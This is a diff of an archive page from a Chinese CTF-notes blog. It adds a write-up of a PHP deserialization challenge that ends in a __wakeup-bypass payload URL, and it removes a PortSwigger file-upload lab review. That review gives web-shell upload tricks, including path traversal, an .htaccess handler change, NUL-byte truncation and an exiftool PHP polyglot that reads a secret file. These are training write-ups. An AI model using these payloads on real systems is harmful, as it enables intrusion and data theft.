@@ -15,7 +15,7 @@
         <link rel="canonical" href="https://guang12-c.github.io/ctf-notes/blog/archive/2026/page/2/">
       
       
-        <link rel="prev" href="../../../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/">
+        <link rel="prev" href="../../../../category/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">
       
       
         <link rel="next" href="../../../../../files/">
@@ -1785,6 +1785,12 @@
       
         
       
+        
+      
+        
+      
+        
+      
     
     
     
@@ -1832,6 +1838,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/js/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2202,6 +2238,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../../category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    客户端信任
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../../../category/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-nav__link">
         
   
@@ -2300,6 +2366,36 @@
     
   
     新手入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逻辑漏洞
   
 
     
@@ -2429,6 +2525,112 @@
       <header class="md-typeset">
         <h1 id="2026">2026<a class="headerlink" href="#2026" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../../../category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="2019-php"><a class="toclink" href="../../../../geek2019-php/">[极客大挑战 2019] PHP</a></h2>
+<p>这道题点进去后，它说有做备份的习惯。查看源代码没啥东西后，使用 dirsearch 开始扫：</p>
+<p><img alt="dirsearch 扫描结果" src="../../../../../assets/images/geek2019-php/01-dirsearch.png" /></p>
+<p>发现了 <code>www.zip</code>，下载下来后发现了几个源代码，一个一个查看。</p>
+<h3 id="flagphp"><a class="toclink" href="../../../../geek2019-php/#flagphp">先看 flag.php</a></h3>
+<p>里面的 flag 是假的。</p>
+<h3 id="indexphp"><a class="toclink" href="../../../../geek2019-php/#indexphp">再看 index.php</a></h3>
+<p>审计发现了参数是 <code>select</code>：</p>
+<p><img alt="index.php" src="../../../../../assets/images/geek2019-php/02-index.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">include 'class.php';</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="x">$select = $_GET['select'];</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="x">$res = unserialize(@$select);</span>
+</span></code></pre></div>
+<h3 id="classphp"><a class="toclink" href="../../../../geek2019-php/#classphp">最后看 class.php</a></h3>
+<p><img alt="class.php" src="../../../../../assets/images/geek2019-php/03-class.png" /></p>
+<p>得知需要让 <code>username = admin</code>，<code>password = 100</code>；再反序列化。</p>
+<p><img alt="__destruct 逻辑" src="../../../../../assets/images/geek2019-php/04-destruct.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="x">function __destruct() {</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="x">    if ($this-&gt;password != 100) {</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="x">        echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="x">        echo "You name is: ";</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="x">        echo $this-&gt;username; echo "&lt;/br&gt;";</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="x">        echo "You password is: ";</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="x">        echo $this-&gt;password; echo "&lt;/br&gt;";</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="x">        die();</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="x">    }</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="x">    if ($this-&gt;username === 'admin') {</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="x">        global $flag;</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="x">        echo $flag;</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="x">    } else {</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="x">        echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="x">        die();</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="x">    }</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="x">}</span>
+</span></code></pre></div>
+<h3 id="__wakeup"><a class="toclink" href="../../../../geek2019-php/#__wakeup">绕过 <code>__wakeup</code></a></h3>
+<p>先进行序列化：</p>
+<p><img alt="本地生成序列化" src="../../../../../assets/images/geek2019-php/05-serialize.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">$a = new Name('admin', 100);</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">echo serialize($a);</span>
+</span></code></pre></div>
+<p>但是要注意这里的 <code>__wakeup()</code>，它会直接将 <code>username</code> 修改为 <code>guest</code>：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">function __wakeup() {</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="x">    $this-&gt;username = 'guest';</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>所以这里必须绕过。利用的办法是：<strong>当序列化串声明的属性个数大于实际属性个数时，会直接跳过 <code>__wakeup()</code></strong>。</p>
+<p>所以这里把属性数由 <code>2</code> 改为 <code>3</code>。</p>
+<div class="admonition note">
+<p class="admonition-title">这个技巧有版本限制</p>
+<p>这是 <strong>CVE-2016-7124</strong>，影响 PHP &lt; 5.6.25 / 7.0.10。</p>
+<p>在 PHP 7.4 上实测：<code>O:4:"Name":3:{...}</code> 会<strong>直接解析失败</strong>（不是跳过 <code>__wakeup</code>，是整个包解析不了）。</p>
+</div>
+<h3 id="00"><a class="toclink" href="../../../../geek2019-php/#00">关于 <code>%00</code></a></h3>
+<p>另外，直接将这个复制到 URL 上时，<code>private</code> 属性名两侧的 <code>%00</code> 会被吞掉，所以先进行 URL 编码再放上去，或者放上去之后再自己手补 <code>%00</code>。</p>
+<h3 id="payload"><a class="toclink" href="../../../../geek2019-php/#payload">最终 payload</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title"><code>O:4:"Name":3:</code> 后面那个冒号不能丢</p>
+<p>✅ <code>O:4:"Name":3:{...}</code></p>
+<p>❌ <code>O:4:"Name":3{...}</code> ← 少一个冒号，<code>unserialize</code> 直接返回 false</p>
+</div>
+<p>成功得到 flag：</p>
+<p><img alt="拿到 flag" src="../../../../../assets/images/geek2019-php/06-flag.png" /></p>
+<h3 id="private-public"><a class="toclink" href="../../../../geek2019-php/#private-public">补充：private 和 public 的序列化区别</a></h3>
+<p><strong><code>private</code> 属性下，构造的序列化串是「类名 + 属性名」的形式（别忘了 <code>%00</code>）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>s:14:"\0Name\0username"      ← \0 + Name + \0 + username = 1+4+1+8 = 14
+</span></code></pre></div>
+<p><strong>而 <code>public</code> 方式只是属性名的形式：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>s:8:"username"
+</span></code></pre></div>
+<p><strong><code>protected</code> 则是 <code>\0*\0属性名</code>。</strong></p>
+<p><strong>长度一律按真实字节数算，<code>\0</code> 算 1 个字节 —— 这也是手写 payload 最容易错的地方。</strong></p>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -3546,139 +3748,6 @@
   </div>
 </article>
       
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-20 00:00:00+00:00">2026-10-20</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../../../category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-meta__link">文件上传</a>, 
-              <a href="../../../../category/portswigger/" class="md-meta__link">PortSwigger</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="portswigger-5"><a class="toclink" href="../../../../portswigger-file-upload/">PortSwigger 文件上传 5 关复盘</a></h2>
-<p>从"能上传"到"能执行"，中间隔了三道门。</p>
-<h3 id="_1"><a class="toclink" href="../../../../portswigger-file-upload/#_1">三道防线</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① 文件名格式校验   字符白名单 ^[a-zA-Z0-9._-]+$
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>② 扩展名黑/白名单   .php 被拒
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>③ Web 服务器 handler 没有该后缀 → 当静态文件返回
-</span></code></pre></div>
-<p><strong>四种报错形态直接对应四层：</strong></p>
-<table>
-<thead>
-<tr>
-<th>你看到的</th>
-<th>卡在哪</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>400 + JSON</td>
-<td>应用层格式校验</td>
-</tr>
-<tr>
-<td>正常页 + "不允许"</td>
-<td>应用层扩展名校验</td>
-</tr>
-<tr>
-<td>403</td>
-<td>权限</td>
-</tr>
-<tr>
-<td><strong>200 + 源码</strong></td>
-<td><strong>服务器 handler 缺失</strong></td>
-</tr>
-<tr>
-<td>200 + 输出</td>
-<td>成功</td>
-</tr>
-</tbody>
-</table>
-<h3 id="1"><a class="toclink" href="../../../../portswigger-file-upload/#1">第 1 关：直接上传</a></h3>
-<p>传 <code>.php</code>（内容是 shell），访问 <code>/files/avatars/shell.php</code>。</p>
-<p><strong>卡点：路径找错。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>❌ /my-account/avatar/shell.php     ← 这是上传接口
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>✅ /files/avatars/shell.php         ← 这是文件目录
-</span></code></pre></div>
-<p><strong>找路径的办法：打开"显示这个文件"的页面，看 <code>&lt;img src&gt;</code>。</strong></p>
-<h3 id="2"><a class="toclink" href="../../../../portswigger-file-upload/#2">第 2 关：路径穿越</a></h3>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="err">filename="../shell.php"</span>
-</span></code></pre></div>
-<p><strong>判断穿越成功没有，看响应字符串：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>The file avatars/shell.php has been uploaded      → ../ 被吃掉
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>The file avatars/../shell.php has been uploaded   → 穿越成功 ✅
-</span></code></pre></div>
-<p><strong>访问时不要带 <code>..</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>❌ /files/avatars/../shell.php
-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>✅ /files/shell.php
-</span></code></pre></div>
-<h3 id="3"><a class="toclink" href="../../../../portswigger-file-upload/#3">第 3 关：扩展名黑名单</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>aa.php      → 被拒
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>aa.pHp5     → 上传成功,但访问返回源码(没有 .php5 的 handler)
-</span></code></pre></div>
-<p><strong>解法：上传 <code>.htaccess</code> 改规则</strong></p>
-<div class="language-apache highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="nb">AddType</span><span class="w"> </span>application/x-httpd-php<span class="w"> </span>.lhm
-</span></code></pre></div>
-<p>然后传 <code>shell.lhm</code> → 执行。</p>
-<div class="admonition warning">
-<p class="admonition-title">三个拼写陷阱</p>
-<p><code>x-httped-php</code> → 应为 <strong><code>x-httpd-php</code></strong>
-<code>.1hm</code> → 应为 <strong><code>.lhm</code></strong>（字母 L，不是数字 1）
-<code>AddType php .lhm</code> → MIME 必须写全</p>
-</div>
-<h3 id="4"><a class="toclink" href="../../../../portswigger-file-upload/#4">第 4 关：混淆扩展名</a></h3>
-<p>白名单只允许 jpg/png。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>shell.php        → 拒绝
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>shell.php.jpg    → 通过,但静态(两边都取最后后缀)
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>shell.php%00.jpg → 执行 ✅（NUL 截断）
-</span></code></pre></div>
-<p><strong>原理：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>校验看到:  shell.php\0.jpg  → 以 .jpg 结尾 → 放行
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>存储使用:  shell.php         → 读到 \0 就停
-</span></code></pre></div>
-<p><strong>我试了 <code>%20</code> 也能过 —— 说明那个实现按空白截断。但这是巧合，不是通用手法。</strong></p>
-<h3 id="5-polyglot"><a class="toclink" href="../../../../portswigger-file-upload/#5-polyglot">第 5 关：多语言文件（polyglot）</a></h3>
-<p>题目只接受"合法图片"，改任何后缀都被拒。</p>
-<p><strong>判断：校验的是内容，不是后缀。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>改后缀有效   → 查后缀
-</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>改后缀无效   → 查内容
-</span></code></pre></div>
-<p><strong>解法：把 PHP 写进真实图片的元数据</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s2">"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;"</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="w">         </span>photo.jpg<span class="w"> </span>-o<span class="w"> </span>shell.php
-</span></code></pre></div>
-<p><strong>为什么需要 START/END 标记：</strong></p>
-<p>PHP 会把 <code>&lt;?php ?&gt;</code> 之外的内容原样输出 —— 响应里混着整张图片的二进制，
-标记让 secret 在垃圾数据里可搜索。</p>
-<h3 id="_2"><a class="toclink" href="../../../../portswigger-file-upload/#_2">收获</a></h3>
-<blockquote>
-<p><strong>上传题永远先问三个问题：存到哪了、存成什么、那个目录执行不执行 PHP。</strong></p>
-<p><strong>"能上传"和"能执行"是两件事 —— 绕过校验 ≠ 拿到 shell。</strong></p>
-<p><strong>遇到"改后缀一直说不是合法图片"，说明它在查内容，别再折腾后缀了。</strong></p>
-</blockquote>
-    
-    
-  </div>
-</article>
-      
       
         
           
@@ -3686,7 +3755,7 @@
 
 
 <nav class="md-pagination">
-  <a class="md-pagination__link" href="../../">1</a> <span class="md-pagination__current">2</span>
+  <a class="md-pagination__link" href="../../">1</a> <span class="md-pagination__current">2</span> <a class="md-pagination__link" href="../3/">3</a>
 </nav>
         
       
